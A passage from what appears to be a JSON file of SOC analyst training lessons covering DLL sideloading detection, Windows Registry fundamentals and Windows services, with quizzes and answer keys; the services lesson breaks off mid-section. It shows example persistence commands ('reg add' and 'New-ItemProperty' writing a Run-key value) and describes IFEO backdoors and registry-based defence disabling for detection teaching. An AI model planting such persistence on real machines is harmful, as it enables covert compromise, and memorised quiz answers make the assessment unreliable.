      "content": "Put the whole lesson together with a single walkthrough, the way you would actually work it as an analyst.\n\n### The alert\n\nYour EDR flags a signed, legitimate application, `UpdateHelper.exe` (a real vendor tool your company uses), for loading an unsigned DLL. The Sysmon Event ID 7 (Image Loaded) record looks like this:\n\n```\nEvent ID: 7 (Image loaded)\nUtcTime: 2026-08-14 03:11:07\nImage: C:\\Program Files\\VendorTool\\UpdateHelper.exe\nImageLoaded: C:\\Program Files\\VendorTool\\version.dll\nFileVersion: -\nSignature: -\nSigned: false\nOriginalFileName: -\n```\n\n### Step 1 — is this DLL supposed to be here?\n\n`version.dll` is a real, common Windows system DLL name — which is exactly the point. A genuine `version.dll` ships signed by Microsoft inside `System32`. This one is unsigned, sitting in the *application's own folder* instead. That mismatch — right name, wrong location, wrong (missing) signature — is the fingerprint from the 'How Attackers Abuse DLLs' section: either search-order hijacking (Windows found this fake `version.dll` before the real one) or sideloading (it was deliberately planted next to a trusted, signed `.exe`).\n\n### Step 2 — check for the drop\n\nYou pull Sysmon Event ID 11 (File Created) for the same host and time window:\n\n```\nEvent ID: 11 (File created)\nUtcTime: 2026-08-14 03:09:52\nImage: C:\\Windows\\explorer.exe\nTargetFilename: C:\\Program Files\\VendorTool\\version.dll\n```\n\nThe malicious DLL was written to disk about ninety seconds *before* it was loaded — the setup step. Note the creating process here is `explorer.exe`, meaning a user (or something acting as one) copied the file in, rather than the vendor's own installer.\n\n### Step 3 — check what the DLL did\n\nProcess and network telemetry for `UpdateHelper.exe` immediately after the load shows it spawning `cmd.exe /c whoami` and making an outbound connection to an IP with no prior history in your environment — behaviour completely unrelated to what an update helper should do, and consistent with the loaded DLL's code now executing with the trusted application's identity.\n\n### Step 4 — the verdict\n\nThree independent signals now agree: an unsigned DLL with a legitimate-sounding name, loaded from the wrong folder, dropped moments earlier by a non-installer process, immediately followed by out-of-character child processes and network activity. Individually, any one of these might have an innocent explanation; together, they tell an unambiguous story of DLL sideloading used to launder malicious execution through a trusted, signed application — exactly the pattern the earlier sections described in the abstract, now visible in real event data."
    }
  ],
  "keyTakeaways": [
    "A DLL (Dynamic Link Library) is a shared library of code that programs load at run time instead of bundling their own copy; Windows itself is built from DLLs like kernel32.dll, ntdll.dll, and user32.dll, and a running process is its .exe plus all the DLLs loaded into it.",
    "When a program loads a DLL by name, Windows follows a defined search order, and if an attacker places a malicious DLL in a location searched first, the program loads it while believing it is the real one.",
    "The main abuse techniques are DLL search-order hijacking (drop a same-named DLL in a searched-first folder), DLL sideloading (place a malicious DLL beside a legitimate signed .exe that loads it), and DLL injection (force a DLL into a running process) — all aiming for execution under a trusted identity.",
    "Reflective DLL injection (T1055.001) goes further by loading code straight into memory without calling LoadLibrary or ever writing the DLL to disk, defeating file-based detection, so EDR must also watch memory allocation, CreateRemoteThread (Sysmon 8), and ProcessAccess (Sysmon 10).",
    "Hunt DLL abuse with Sysmon Event ID 7 (image loaded): look for DLLs from unusual/user-writable paths, unsigned or wrong-vendor DLLs in trusted processes, well-known names in the wrong place, plus rundll32/regsvr32 loading odd DLLs — and tie findings back to the process tree, as a full worked example (unsigned version.dll, its file-creation event, and follow-on command execution) shows."
  ],
  "quiz": [
    {
      "question": "An attacker places a malicious DLL named the same as one a legitimate signed application expects, in the application's own folder, so that when the app runs it loads the attacker's DLL instead of the genuine one. What is this technique called, and why is it effective?",
      "options": [
        {
          "label": "It is called static linking, and it works because the malicious code is compiled directly into the application's executable before it is ever signed.",
          "value": "a"
        },
        {
          "label": "It is DLL search-order hijacking, and it works because Windows searches certain folders first, so the attacker's DLL is found and loaded inside a trusted program.",
          "value": "b"
        },
        {
          "label": "It is a firewall bypass, and it works because DLLs travel over the network on trusted ports that perimeter defences are configured to always allow.",
          "value": "c"
        },
        {
          "label": "It is called PID reuse, and it works because the malicious DLL inherits the process ID of a system service that antivirus has already whitelisted.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Placing a malicious DLL with an expected name where Windows searches before the legitimate copy is DLL search-order hijacking; it is effective because the trusted (often signed) program loads the attacker's DLL believing it is genuine, so the code runs under that program's identity. Option a describes static linking, which is unrelated. Option c invents a network mechanism DLL loading does not use. Option d confuses this with PID reuse, which has nothing to do with DLL loading."
    },
    {
      "question": "Which telemetry is most directly useful for detecting a sideloaded or hijacked DLL, and what specifically would you look for?",
      "options": [
        {
          "label": "Firewall allow/deny logs, looking for the exact moment the DLL file was transmitted inbound over TCP port 445 from the attacker's server.",
          "value": "a"
        },
        {
          "label": "Sysmon Event ID 7 (image loaded), looking for a DLL loaded from an unusual or user-writable path, or an unsigned DLL inside a trusted process.",
          "value": "b"
        },
        {
          "label": "The Windows Registry Run keys, looking for the DLL's full contents stored as a value that executes automatically at every user logon.",
          "value": "c"
        },
        {
          "label": "DHCP lease records, looking for the DLL requesting its own IP address so it can communicate with the rest of the corporate network.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Sysmon Event ID 7 records every DLL a process loads with its path and signature status, so it is the workhorse for spotting sideloading and hijacking: a DLL from an unusual or user-writable path, or an unsigned/wrong-vendor DLL inside a trusted process, is the anomaly. Option a describes network transfer, not DLL loading. Option c misdescribes Run keys, which do not store DLL contents. Option d is nonsensical because DLLs do not request IP addresses."
    },
    {
      "question": "Which detail distinguishes reflective DLL injection from the classic search-order hijacking / sideloading techniques covered earlier, and why does it evade file-based detection?",
      "options": [
        {
          "label": "Reflective injection always requires local administrator rights, while both hijacking and sideloading can succeed under a completely standard, unprivileged user account.",
          "value": "a"
        },
        {
          "label": "It loads code directly into process memory without calling the normal Windows loader or writing a DLL file to disk, so file and image-load telemetry sees nothing.",
          "value": "b"
        },
        {
          "label": "Reflective injection only targets Linux shared object files, while hijacking and sideloading are exclusively Windows DLL techniques aimed at signed .exe programs.",
          "value": "c"
        },
        {
          "label": "Reflective injection forges a valid digital signature onto the malicious code, which is why signature-checking tools always report it as fully signed and trusted.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Reflective DLL injection implements its own loader and maps code straight into memory, often without the DLL ever existing as a file on disk, so it bypasses the LoadLibrary calls and file-creation events that expose hijacking and sideloading — defenders must add memory/injection telemetry (CreateRemoteThread, ProcessAccess) to catch it. Option a is false; privilege level is not what distinguishes these techniques. Option c wrongly confines reflective injection to Linux; it is a core Windows technique (T1055.001). Option d is false — reflective injection does not forge signatures, it simply avoids the file-based checkpoints signatures are validated at."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1574/001/",
    "https://attack.mitre.org/techniques/T1574/002/",
    "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order",
    "https://attack.mitre.org/techniques/T1055/001/"
  ],
  "xp": 230,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-registry-fundamentals",
  "slug": "windows-registry-fundamentals",
  "title": "The Windows Registry: Fundamentals for Analysts",
  "topic": "Windows Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Behind almost every setting on a Windows machine — from your desktop wallpaper to which programs start at boot — sits the Registry: a vast, hierarchical database that stores the configuration of Windows and everything installed on it. For a SOC analyst the Registry is both a map of how a system is configured and one of the most common places attackers hide to survive a reboot. This lesson explains what the Registry is, how it is structured into hives, keys, and values, the specific locations that matter for security, how to read Registry activity in your telemetry, the actual tools (regedit, reg.exe, PowerShell) you use to inspect and query it, and a tour of the more subtle Registry persistence and defense-evasion techniques — COM hijacking, IFEO debuggers, and fileless payload storage — that go beyond the basic Run key.",
  "sections": [
    {
      "heading": "What the Registry Is",
      "content": "The **Windows Registry** is a central, hierarchical database that stores configuration settings for the operating system, hardware, installed applications, and user preferences. Almost everything Windows needs to remember about *how it should behave* lives here: which programs run at startup, file associations, driver settings, installed software, user profiles, and countless security-relevant options.\n\nThe cleanest analogy is a giant, organised **settings filing cabinet** for the whole computer. Where a phone keeps its settings in one Settings app, Windows keeps its settings — millions of them — in this single structured database that programs read and write constantly, usually without the user ever seeing it.\n\nYou can view the Registry with the built-in **Registry Editor** (`regedit`), which presents it as a tree you can browse, much like folders and files. But most Registry activity is invisible and automatic: when you install a program, it writes settings into the Registry; when Windows boots, it reads the Registry to know what to load; when you change a setting, that change is stored there.\n\nWhy does this matter so much to security? Two reasons that run through the whole lesson:\n\n- **The Registry controls what runs and how the system behaves.** If an attacker can write to the right place, they can make their malware launch automatically, weaken a security setting, or change how Windows handles something — all through configuration, without dropping an obviously malicious program.\n- **It is a durable place to hide.** Registry changes survive reboots. An attacker who only has code running in memory loses everything when the machine restarts; an attacker who has planted a Registry entry that relaunches their malware at boot has **persistence**.\n\nFor an analyst, the Registry is therefore both a rich source of evidence about a system's state and a prime hunting ground for attacker footholds. To use it, you first need to understand how it is organised — the subject of the next section."
    },
    {
      "heading": "Hives, Keys, and Values",
      "content": "The Registry is organised like a filing system, with three levels of structure an analyst should know by name.\n\n**Keys** are the containers, equivalent to folders. They can contain other keys (subkeys) and can nest many levels deep, forming the Registry's tree. A full path to a key reads like a folder path, for example `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows`.\n\n**Values** are the actual settings stored inside keys, equivalent to the files inside folders. Each value has a **name**, a **type** (such as a string, a number, or binary data), and its **data** (the setting itself). So a key is *where* a setting lives, and a value is the setting.\n\n**Hives** are the top-level branches — the major sections the whole tree is divided into. There are five you will meet, usually abbreviated:\n\n| Hive | Abbreviation | What it holds |\n|------|--------------|---------------|\n| HKEY_LOCAL_MACHINE | **HKLM** | System-wide settings for the whole machine and all users |\n| HKEY_CURRENT_USER | **HKCU** | Settings for the currently logged-on user |\n| HKEY_USERS | HKU | Settings for all user profiles on the machine |\n| HKEY_CLASSES_ROOT | HKCR | File associations and program registrations |\n| HKEY_CURRENT_CONFIG | HKCC | The current hardware profile |\n\nThe two that dominate investigations are **HKLM** and **HKCU**. The distinction is important and security-relevant: **HKLM** affects the *entire machine* and normally requires administrator rights to change, while **HKCU** affects only the *current user* and can be changed by that user without admin rights. This is why some persistence lives in HKCU (any user can write it) and some in HKLM (broader effect, needs privilege) — the choice tells you something about the attacker's access level.\n\nUnderstanding this structure lets you read any Registry path in a log or report: you can immediately see which hive (whole machine or one user), navigate the key path (the folders), and interpret the value (the specific setting) and its data. With that literacy, the security-critical locations in the next section become meaningful rather than mysterious."
    },
    {
      "heading": "The Registry Locations That Matter for Security",
      "content": "Of the millions of Registry values, a relatively small set is disproportionately important to attackers and defenders. Knowing these by category lets you focus your attention.\n\n### Autorun / persistence keys — the big one\n\nCertain keys tell Windows to run a program automatically. The most famous are the **Run** and **RunOnce** keys:\n\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs for all users at boot)\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs when that user logs in)\n\nAny program listed in these keys launches automatically. This makes them the single most common place attackers plant **persistence** — add a value pointing at your malware, and Windows relaunches it every boot or logon. MITRE ATT&CK tracks this as **Boot or Logon Autostart Execution: Registry Run Keys**. There are many other autostart locations (services, scheduled-task references, startup folders), but Run/RunOnce are the classic hunting ground.\n\n### Service configuration\n\nWindows services are defined under `HKLM\\System\\CurrentControlSet\\Services`. Because a service can run malware at boot with high privilege, changes here matter (services get their own lesson).\n\n### Security-weakening settings\n\nAttackers modify Registry values to disable defences — turning off security features, weakening authentication settings, or disabling logging. A change to a security-relevant value is a strong signal.\n\n### Evidence of activity\n\nSome keys are prized in forensics because they record what happened: keys that track recently run programs, USB devices that were connected, and user activity. Analysts and incident responders mine these to reconstruct a timeline.\n\nThe practical skill is **recognising when a Registry location is security-relevant**. A new value under a Run key, a change to a service definition, or a modification to a known security setting should draw your eye immediately. Attackers rely on the Registry being enormous and noisy; your advantage is knowing the short list of places that actually matter, so a change there stands out against the background."
    },
    {
      "heading": "Reading Registry Activity in Telemetry",
      "content": "Because the Registry is where so much persistence and defense-evasion lives, watching changes to it is core detection work. Registry modifications are observable events, and a few sources capture them.\n\n### Sysmon registry events\n\nThe **Sysmon** tool records Registry activity in three related events: **Event ID 12** (key created or deleted), **Event ID 13** (value set), and **Event ID 14** (key renamed). Event ID **13** is especially useful — it captures a value being written, including the target path and the data. A value being set under a **Run** key is exactly the kind of high-value event to alert on.\n\n### Windows Security auditing\n\nWith object-access auditing enabled, Windows logs **Event ID 4657** when a Registry value is modified. This requires configuration but provides an audited trail of changes to sensitive keys.\n\n### Command-line and process telemetry\n\nAttackers often modify the Registry using the built-in **`reg.exe`** command or PowerShell. So process-creation logs showing `reg add` writing to a Run key, or PowerShell manipulating the Registry, are a complementary signal — and they tie the change back to a **process and its parent** (the lineage from the processes lesson).\n\n### How to hunt\n\nFocus on the short list of security-relevant locations rather than trying to watch everything:\n\n- **New or modified values under Run / RunOnce keys**, especially pointing at unusual paths (a user's Temp or Downloads folder) or at scripts.\n- **Changes to service definitions** under the Services key.\n- **Modifications to known security settings** (disabling protections or logging).\n- **`reg.exe` / PowerShell writing to autostart or security keys**, correlated with a suspicious parent process.\n\nThe unifying idea is **baseline and deviation applied to configuration**. Normal software does write to the Registry, so the goal is not to flag every change but to recognise changes that match attacker behaviour: persistence planted in an autorun key, a defence quietly disabled, a service pointed at a suspicious binary. Pair any such find with the surrounding process tree and file activity, and a lone Registry event becomes a clear picture of an attacker establishing a foothold or clearing a path."
    },
    {
      "heading": "Tools for Viewing and Editing the Registry",
      "content": "### regedit — the GUI\n\nThe built-in **Registry Editor** (`regedit.exe`) presents the Registry as a browsable tree: hives at top, keys nested below, values listed on the right with their name, type, and data. It is how most people first encounter the Registry, and it is fine for one-off lookups, but it does not scale to investigation work across many machines.\n\n### reg.exe — the command line\n\nThe **`reg`** command queries and edits the Registry from a shell, and it is what both administrators and attackers script with. A few forms you will see constantly in logs:\n\n```\nC:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    OneDrive    REG_SZ    C:\\Users\\d.rosen\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background\n\nC:\\> reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Users\\d.rosen\\AppData\\Roaming\\upd.exe\" /f\n```\n\nThe first command lists what already auto-starts for this user (here, legitimately, OneDrive). The second — `reg add` — is the exact command shape attackers use to *plant* a persistence value: notice the target key is the Run key from the earlier section, the value points at a binary in `AppData\\Roaming` (a user-writable, non-standard location for software), and `/f` forces the write without confirmation. Seeing `reg add` targeting a Run/RunOnce key or a Services key in your process/command-line telemetry is close to a direct alert.\n\n### PowerShell\n\nPowerShell treats the Registry as just another drive, which makes it scriptable and — for the same reason — abusable:\n\n```\nPS C:\\> Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\nPS C:\\> New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value 'C:\\Users\\d.rosen\\AppData\\Roaming\\upd.exe' -PropertyType String\n```\n\n`Get-ItemProperty` reads a key's values (the investigator's tool); `New-ItemProperty` writes a new one (the same action `reg add` performs, just via PowerShell — which is why PowerShell script-block logging, Event ID **4104**, is a valuable companion to Registry telemetry: it can show the *exact* line that wrote a persistence value).\n\n### Why analysts need both the viewer and the log\n\nRunning `reg query` or `Get-ItemProperty` yourself tells you the *current state* of a key — useful when you already suspect a specific location. But it only shows you what is there *now*, not what changed, when, or by what process. That is why live investigation always pairs manual queries (to check a hypothesis) with the historical telemetry from the previous section (to see the moment of compromise) — the tools answer 'what does this look like today', the logs answer 'what happened and who did it'."
    },
    {
      "heading": "Case Study: Fileless Persistence and Defense Evasion via the Registry",
      "content": "The Run key is the famous example, but it is only the beginning. Several more subtle Registry techniques are worth knowing by name because they appear constantly in real intrusions.\n\n### COM hijacking\n\nWindows' **Component Object Model (COM)** lets programs invoke reusable components by a registered identifier (a **CLSID**) rather than a file path; the Registry under `HKCU\\Software\\Classes\\CLSID\\{...}\\InprocServer32` (or the equivalent HKLM location) maps that identifier to the DLL that implements it. **COM hijacking** (MITRE **T1546.015**) replaces that mapping so that when some legitimate program asks Windows to load a common COM component, it gets the attacker's DLL instead. Because thousands of routine Windows operations use COM internally, a hijacked, frequently-invoked CLSID gives an attacker a persistence trigger that fires constantly and blends into normal system chatter.\n\n### Image File Execution Options (IFEO) / Debugger persistence\n\nThe key `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<program.exe>` was designed so developers could attach a debugger to a specific program automatically. Set a `Debugger` value under an entry for, say, `sethc.exe` (the Sticky Keys accessibility program, launchable from the Windows logon screen) and Windows will silently run *that* program instead whenever `sethc.exe` is invoked — a well-known technique (MITRE **T1546.012**) for planting a backdoor reachable even before anyone logs in.\n\n### Disabling defenses via the Registry\n\nMany security products expose their configuration through the Registry, so disabling protection is often just a value change rather than uninstalling anything. Values under paths like `HKLM\\Software\\Policies\\Microsoft\\Windows Defender` control real-time protection and reporting; setting the relevant values to disable scanning is a documented defense-evasion move (MITRE **T1562.001**, Impair Defenses). This is why unexpected changes to security-product Registry keys are treated as high-severity — they often precede or accompany other malicious activity, as the attacker clears the path.\n\n### Fileless payloads stored as Registry data\n\nBecause a Registry value can hold arbitrary data, some malware stores its actual malicious payload — often Base64-encoded or encrypted PowerShell — directly as value data, with only a tiny loader script (planted via a Run key or a scheduled task) that reads the value and executes it in memory. This keeps the bulk of the malicious code off the filesystem entirely, so file-based antivirus scanning never sees it; only Registry and process/PowerShell telemetry does.\n\n### The common thread\n\nRun-key persistence, COM hijacking, IFEO debuggers, defense-tampering, and fileless payload storage are all, mechanically, the same act — **writing an unexpected value to a security-relevant key** — dressed up differently. That is why the detection approach from the earlier section (watch Sysmon 12/13/14 and Event 4657 against the *short list* of security-relevant locations) generalises across all of them: the specific key differs, but the signal — an unexpected write, from an unexpected process, to a location that controls what runs or how the system defends itself — is the same."
    }
  ],
  "keyTakeaways": [
    "The Windows Registry is a central hierarchical database of configuration for the OS, hardware, apps, and users; it controls what runs and how the system behaves, and its changes survive reboots — making it both an evidence source and a prime place for attacker persistence.",
    "It is structured as hives (top branches — HKLM for the whole machine, HKCU for the current user), keys (folders), and values (name/type/data settings); HKLM usually needs admin rights while HKCU does not, which hints at an attacker's privilege level.",
    "The security-critical locations are autorun keys (HKLM/HKCU ...CurrentVersion\\Run and RunOnce — the classic persistence spot, MITRE Registry Run Keys), service configuration, defence-weakening settings, and forensic activity keys.",
    "Detect Registry abuse with Sysmon Event IDs 12/13/14 (especially 13, value set) and Windows Event 4657, plus reg.exe/PowerShell command-line telemetry (reg add, New-ItemProperty) — focusing on new values in Run keys, service changes, and disabled protections, tied to the responsible process.",
    "Beyond the Run key, attackers use COM hijacking (T1546.015, hijacked CLSID mappings), IFEO Debugger persistence (T1546.012), disabling defenses via Registry policy keys (T1562.001), and storing fileless, encoded payloads directly as value data — all variations on the same act: an unexpected write to a security-relevant key."
  ],
  "quiz": [
    {
      "question": "You find that malware wrote a new value pointing to itself under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. What is the attacker most likely achieving, and what does the use of HKCU (rather than HKLM) suggest?",
      "options": [
        {
          "label": "They are encrypting the user's files, and HKCU indicates the malware has gained full SYSTEM-level privileges across the entire machine.",
          "value": "a"
        },
        {
          "label": "They are establishing persistence so the malware relaunches at logon, and HKCU suggests they are operating with only the current user's rights, not admin.",
          "value": "b"
        },
        {
          "label": "They are disabling the firewall, and HKCU means the change applies to every user account and every computer joined to the domain at once.",
          "value": "c"
        },
        {
          "label": "They are deleting event logs, and the Run key is where Windows stores audit records that the attacker is now overwriting to hide activity.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A value under a Run key makes Windows launch the named program automatically at logon, which is classic persistence; using HKCU (current user) rather than HKLM (whole machine) suggests the attacker has only the user's privileges, since HKLM changes normally require admin rights. Option a wrongly ties Run keys to encryption and misreads HKCU as SYSTEM. Option c misdescribes HKCU's scope (it affects only the current user). Option d falsely claims Run keys store audit logs."
    },
    {
      "question": "Which Sysmon event is most directly useful for catching persistence being planted in a Registry Run key, and why?",
      "options": [
        {
          "label": "Event ID 1 (process creation), because it records the exact registry value data written and the hive the persistence was placed into.",
          "value": "a"
        },
        {
          "label": "Event ID 13 (registry value set), because it captures a value being written including the target path, so a write to a Run key stands out.",
          "value": "b"
        },
        {
          "label": "Event ID 3 (network connection), because Registry Run-key persistence is transmitted to the endpoint over the network and logged as a connection.",
          "value": "c"
        },
        {
          "label": "Event ID 7 (image loaded), because writing a Run-key value is internally performed by loading a DLL that the event records in detail.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Sysmon Event ID 13 records a registry value being set, including the target path and data, so a value written under a Run key is exactly what it captures and is a high-value alert. Option a is wrong because Event ID 1 records process creation, not registry value data. Option c is wrong because planting a Run key is a local write, not a network event. Option d misattributes the write to a DLL image-load event."
    },
    {
      "question": "You find HKLM\\...\\Image File Execution Options\\sethc.exe has a Debugger value pointing to cmd.exe. What does this configuration achieve, and why is it dangerous?",
      "options": [
        {
          "label": "It slows down sethc.exe's startup for debugging purposes, a routine developer setting that has no effect on security or system access.",
          "value": "a"
        },
        {
          "label": "It makes Windows launch cmd.exe instead of Sticky Keys whenever sethc.exe is invoked, giving an attacker a shell reachable even from the logon screen.",
          "value": "b"
        },
        {
          "label": "It permanently deletes the sethc.exe program from the system, so Sticky Keys can never be triggered by any user again.",
          "value": "c"
        },
        {
          "label": "It forces every program on the machine to run through a debugger, which encrypts all files as a side effect of the setting.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "An IFEO Debugger value redirects execution of the named program to the debugger program instead — so invoking sethc.exe (reachable from the Windows logon screen via Sticky Keys) actually launches cmd.exe, giving an attacker a privileged shell without logging in, a known technique (T1546.012). Option a wrongly calls this a harmless developer setting. Option c is false; the value redirects execution, it does not delete the file. Option d invents a system-wide debugging/encryption effect that IFEO does not have."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry",
    "https://attack.mitre.org/techniques/T1547/001/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
    "https://attack.mitre.org/techniques/T1546/015/",
    "https://attack.mitre.org/techniques/T1546/012/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-services-fundamentals",
  "slug": "windows-services-fundamentals",
  "title": "Windows Services Fundamentals",
  "topic": "Windows Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Much of what Windows does happens without any window on screen: updating itself, listening for network connections, running antivirus, printing. These background workers are Windows services, and they start before anyone even logs in. For a SOC analyst, services are a double-sided topic — they are essential system machinery, and they are one of the most reliable ways attackers gain privileged, boot-surviving persistence. This lesson explains what a service is, how Windows manages and runs them, why svchost.exe hosts so many, how attackers abuse services — with the telemetry that reveals it, the actual tools (services.msc, sc.exe, PowerShell) you use to inspect and create services yourself, and a full worked investigation of PsExec-style lateral movement caught through a single service-creation event.",
  "sections": [
    {
      "heading": "What a Windows Service Is",
      "content": "A **Windows service** is a program that runs in the background, without a user interface, typically starting automatically when the computer boots and running whether or not anyone is logged in. Services are the invisible workforce of Windows: Windows Update, the print spooler, the firewall, antivirus engines, and countless others are services quietly doing their jobs.\n\nThe contrast with an ordinary application makes the idea concrete. When you open a web browser, *you* launch it, it shows a window, and it runs as *your* user account; when you log off, it closes. A service is the opposite in every respect: it starts on its own (often at boot), has no window, and runs under a **service account** independent of any logged-in user. That is precisely what you want for machinery that must run continuously — a mail server or antivirus cannot depend on someone being logged in.\n\nThe security-critical feature is **which account a service runs as**. Services frequently run under powerful built-in accounts:\n\n- **LocalSystem** — an extremely privileged account with near-total control of the machine. Many core services run as LocalSystem.\n- **LocalService** and **NetworkService** — lower-privileged built-in accounts for services that need less.\n- **A custom service account** — a dedicated account created for a specific service.\n\nBecause a service can run at boot, with high privilege, and without a user present, it is an almost ideal vehicle for an attacker: install a malicious service and your code runs automatically, early, and powerfully, every time the machine starts. That is the theme of this lesson — services are essential, and their very strengths (autostart, privilege, invisibility) are exactly what make them attractive to abuse. To see how that abuse works, you first need to know how Windows manages services, the next section."
    },
    {
      "heading": "How Windows Manages and Runs Services",
      "content": "Windows coordinates all services through a central component and exposes several ways to view and control them.\n\n### The Service Control Manager (SCM)\n\nThe **SCM** is the part of Windows responsible for starting, stopping, and tracking services. At boot it reads which services should start and launches them; while the system runs, it monitors their state and can restart them if they fail. Every service is registered with the SCM, and its configuration lives in the Registry under `HKLM\\System\\CurrentControlSet\\Services` (connecting to the Registry lesson).\n\n### Start types\n\nEach service has a **start type** that controls when it runs:\n\n- **Automatic** — starts at boot.\n- **Automatic (Delayed Start)** — starts shortly after boot, to reduce startup load.\n- **Manual** — starts only when something requests it.\n- **Disabled** — will not start at all.\n\nAn attacker planting persistence typically wants **Automatic**, so their code runs on every boot.\n\n### svchost.exe — the shared host\n\nMany Windows services are not standalone `.exe` files; they are DLLs run inside a shared host process called **`svchost.exe`** (Service Host). To save resources, Windows groups multiple services into `svchost.exe` instances, so you will see *many* `svchost.exe` processes running, each hosting one or more services. This is normal — but it is also why attackers love to imitate it. A legitimate `svchost.exe` is always launched by **`services.exe`** (the SCM's process) and lives in `System32`; malware masquerading as `svchost.exe` from the wrong folder or under the wrong parent is a classic tell (recall the process-tree lesson).\n\n### Tools to view and control services\n\nAnalysts and admins use the **Services console** (`services.msc`) for a graphical list, and the command-line **`sc.exe`** to query and configure services (`sc query`, `sc create`, `sc config`). Attackers use these same tools — a service being created with `sc create` is something worth watching.\n\nWith this model in mind — SCM launching Automatic services at boot, many hidden inside svchost, all configured in the Registry — you can see exactly where an attacker inserts themselves, which the next section makes explicit."
    },
    {
      "heading": "How Attackers Abuse Services",
      "content": "Services give attackers three things they prize: **automatic startup**, **high privilege**, and **legitimate-looking cover**. Several techniques exploit this, all catalogued by MITRE ATT&CK under **Create or Modify System Process: Windows Service** and related entries.\n\n### Creating a malicious service (persistence + privilege)\n\nThe attacker registers a new service that points at their malware and sets it to start automatically. Now their code runs at every boot, typically as **LocalSystem** — early, automatic, and highly privileged. This is one of the most durable persistence mechanisms available, because it survives reboots and logoffs and runs before most user activity.\n\n### Hijacking an existing service\n\nRather than create a new service (which is noisier), an attacker may modify an existing one — changing the binary path it points to so the legitimate service now launches the attacker's code, or replacing the service's executable on disk. The service name looks normal; the code behind it is not.\n\n### Service-based remote execution — PsExec\n\nA hugely common technique for **lateral movement** relies on services. Tools like **PsExec** work by connecting to a remote machine, copying a program to it, and **creating a service** to run that program remotely. This is why unexpected service creation on a machine — especially one you did not administer — is a hallmark of an attacker spreading through the network. The famous **service-creation event** (below) lights up when this happens.\n\n### Service account abuse\n\nBecause services often run as powerful accounts, compromising or abusing a service is a path to privilege. And custom **service accounts** — with strong permissions and passwords that rarely change — are targets in their own right (the weakness behind Kerberoasting, covered elsewhere).\n\nWhat ties these together is that a service is a *trusted, privileged, automatic* execution slot. An attacker who controls one has a foothold that is hard to dislodge and easy to overlook, because \"a service\" sounds inherently legitimate. That is exactly why the SOC watches service activity closely, which the final sections detail."
    },
    {
      "heading": "Detecting Malicious Service Activity",
      "content": "Service abuse is loud if you are listening on the right channel, because installing or changing a service generates specific, well-known events.\n\n### The headline event: 7045\n\nWindows Security/System logging records **Event ID 7045** when **a new service is installed**, capturing the service name and the binary it will run. This is one of the highest-value events in Windows monitoring. A new service whose binary sits in a user's Temp or Downloads folder, has a random-looking name, or appears on a machine during suspected lateral movement (the PsExec pattern) is a strong indicator of compromise. Many real intrusions are caught precisely at the 7045 event.\n\n**Supporting events:**\n\n- **Event ID 7034 / 7036** — a service crashed or changed state (started/stopped). A security service unexpectedly stopping can indicate tampering.\n- **Event ID 4697** — service installation recorded via Security auditing (a complementary source to 7045).\n- **Registry telemetry** — changes under `HKLM\\System\\CurrentControlSet\\Services` (Sysmon registry events) reveal services being created or reconfigured, including binary-path changes that signal hijacking.\n- **Process and command-line logs** — `sc create`, `sc config`, or PsExec-style activity, tied back to the responsible process and its parent.\n\n### How to hunt\n\nTreat service *creation and modification* as inherently interesting and validate each against what is normal:\n\n- **New services (7045)** pointing at suspicious paths, with odd names, or created around other signs of intrusion.\n- **Changes to an existing service's binary path**, the fingerprint of hijacking.\n- **`svchost.exe` anomalies** — a process named svchost running from the wrong folder or launched by something other than `services.exe`.\n- **Security services stopping** unexpectedly.\n\nThe defensive principle is that **legitimate new services are relatively rare and usually tied to software installs**, so a service appearing outside that context deserves scrutiny. Combine the service event with the surrounding story — the process that created it, the file it points to, and whether this machine was already showing signs of attacker activity — and a single 7045 becomes the moment you catch persistence or lateral movement in the act."
    },
    {
      "heading": "Tools for Managing and Investigating Services",
